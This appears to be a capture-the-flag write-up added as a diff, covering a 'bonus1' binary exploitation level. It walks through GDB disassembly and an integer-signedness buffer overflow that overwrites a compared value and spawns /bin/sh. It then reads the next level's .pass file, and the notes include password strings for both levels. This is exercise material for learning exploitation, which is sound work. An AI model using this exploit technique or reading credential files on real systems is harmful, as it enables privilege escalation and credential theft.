@@ -1,0 +1,102 @@
+login : pw
+	bonus1 : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+disas main
+	=> allocated 0x40 = 64
+	=> atoi called with [ebp+0xc]+0x4 = av[1]
+		=> stores ret value in esp+0x3c
+	=> compared ret with 0x9
+		=> if not less or equal
+			=> store 1 in eax
+			=> jmp main+127
+			=> ret 1
+	=> memcpy called with
+		=> esp+0x8 is [eax*4+0x0] which is esp+0x3c
+			=> atoi ret value multiplied by 4
+		=> esp+0x4 is [ebp+0xc]+0x8 = av[2]
+		=> esp is esp+0x14
+			=> buf size = 0x40-0x14-0x4 = 40
+				=> base pointer
+	=> compares esp+0x3c with 0x574f4c46
+		=> esp+0x3c = ret value from atoi
+		=> 0x574f4c46 = 1464814662
+		=> if not equal
+			=> jmp main+122
+			=> return 0
+	=> execl call with
+		=> esp+0x8 = 0
+		=> esp+0x4 = 0x8048580
+			=> x/s 0x8048580
+				=> "sh"
+		=> esp = 0x8048583
+			=> x/s 0x8048583
+				=> "/bin/sh"
+
+We need to provide an av[1] whose atoi ret value is less than 10
+We need to exploit memcpy to overwrite ret value from atoi (esp+0x3c) to be 1464814662
+
+av[2] size is not limited so this should be easy
+
+Lets start with av[1]
+	b*main+79
+		=> before memcpy call
+	=> atoi only recognizes numerical chars
+	r 9 abc
+		=> breakpoint hit, perfect
+	=> p/x $esp+0x3c
+		=> 0xbffff62c
+	=> p/x $esp+0x14
+		=> 0xbffff604
+	=> 0xbffff604 < 0xbffff62c
+		=> We can overwrite it
+		=> 0xbffff62c-0xbffff604 = 40
+			=> We need 44
+
+We need to have a bigger value than < 10 * 4 for first if condition
+atoi returns an int
+memcpy takes an unsigned int for the size
+We can play with that to get a bigger memcpy
+	=> Still having breakpoint in main+79, let's try a couple things
+		=> $esp+0x8 holds size var
+		=> r -1 abc
+			=> x/u $esp+0x8
+				=> 4294967292
+					=> too big we will segfault
+		=> r -2147483648 abc
+			=> x/u $esp+0x8
+				=> 0
+		=> r -2147483647 abc
+			=> x/u $esp+0x8
+				=> 4
+		=> p/d -2147483648+44/4
+			=> -2147483636
+
+So we have our first param to copy 44 bytes
+
+Lets try if it works as intended
+
+delete
+b*main+84
+	=> right before comparison
+r -2147483636 $(python -c 'print "a"*40 + "bbbb"')
+	=> x/xw $esp+0x3c
+		=> 0x62626262
+
+Perfect, lets replace our b's with the appropriate value (0x574f4c46)
+
+r -2147483636 $(python -c 'print "a"*40 + "\x46\x4c\x4f\x57"')
+	=> x/xw $esp+0x3c
+		=> 0x574f4c46
+
+c
+	=> shell started
+
+Lets try outside of gdb
+./bonus1 -2147483636 $(python -c 'print "a"*40 + "\x46\x4c\x4f\x57"')
+	=> shell started
+
+whoami
+	=> bonus2
+cat /home/user/bonus2/.pass
+	=> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
